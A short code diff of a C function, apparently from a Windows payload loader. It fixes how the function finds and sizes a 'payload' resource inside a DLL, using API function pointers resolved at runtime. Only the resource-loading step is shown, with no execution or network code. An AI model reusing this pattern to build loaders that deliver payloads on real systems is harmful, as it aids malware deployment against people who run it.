@@ -4,13 +4,13 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
     
     DEBUG_PRINT("LoadData: Attempting to load payload from resource section...");
 
-    hRes = pfnFindResourceA(NULL, MAKEINTRESOURCE(PAYLOAD_RESOURCE_ID), RT_RCDATA);
+    hRes = pfnFindResourceA(g_hModule, MAKEINTRESOURCE(PAYLOAD_RESOURCE_ID), RT_RCDATA);
     if (hRes == NULL) {
-        DEBUG_PRINT("LoadData: FindResourceA failed. Could not find payload resource.");
+        DEBUG_PRINT("LoadData: FindResourceA failed. Could not find payload resource in module %p.", g_hModule);
         return FALSE;
     }
 
-    hResLoad = pfnLoadResource(NULL, hRes);
+    hResLoad = pfnLoadResource(g_hModule, hRes);
     if (hResLoad == NULL) {
         DEBUG_PRINT("LoadData: LoadResource failed.");
         return FALSE;
@@ -22,7 +22,7 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
         return FALSE;
     }
 
-    *pdwDataSize = pfnSizeofResource(NULL, hRes);
+    *pdwDataSize = pfnSizeofResource(g_hModule, hRes);
     if (*pdwDataSize == 0) {
         DEBUG_PRINT("LoadData: SizeofResource returned 0.");
         return FALSE;
